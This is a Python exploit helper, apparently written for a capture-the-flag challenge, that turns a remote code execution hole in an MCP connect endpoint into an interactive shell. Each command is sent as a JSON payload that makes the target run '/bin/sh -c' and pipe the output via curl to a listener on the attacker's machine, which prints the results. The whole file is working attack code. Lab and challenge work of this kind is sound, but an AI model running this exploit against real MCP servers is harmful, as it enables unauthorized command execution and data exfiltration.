"""
Opens a simulated shell that does the RCE exploit requests
for you in the background. Use this as a helper to test this
challenge. Smart players would come up with something like
this too so they can solve this faster :)
"""

import http.server
import json
import readline  # noqa: F401 — importing wires input() up to GNU readline: arrow
                  # keys, history, Ctrl+A/E/W, etc. Just for interactive feel.
import socketserver
import threading
import urllib.request

LHOST = "172.18.0.1"    # Local docker network ip
LPORT = 4444            # Arbitrary free port, change if needed

class Catcher(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "replace")
        if body:
            print(f"\r{body}")
        self.send_response(200)
        self.end_headers()

    def log_message(self, *_):
        pass


def start_listener(port):
    httpd = socketserver.TCPServer(("0.0.0.0", port), Catcher)
    httpd.allow_reuse_address = True
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


def send(target, lhost, lport, cmd):
    payload = {
        "serverId": "maintenance",
        "serverConfig": {
            "command": "/bin/sh",
            "args": ["-c", cmd + f" | curl -s --data-binary @- http://{lhost}:{lport}/"],
            "env": {},
        },
    }
    req = urllib.request.Request(
        target.rstrip("/") + "/api/mcp/connect",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        urllib.request.urlopen(req, timeout=10)
    except urllib.error.HTTPError:
        pass


def main():
    print(f"[*] listener on 0.0.0.0:{LPORT} (target dials back to {LHOST})")
    httpd = start_listener(LPORT)
    try:
        while True:
            try:
                cmd = input("mcpjam>$ ")
            except KeyboardInterrupt:
                print()
                break
            if not cmd:
                continue
            send("http://localhost:6274", LHOST, LPORT, cmd)
    finally:
        httpd.shutdown()


if __name__ == "__main__":
    main()
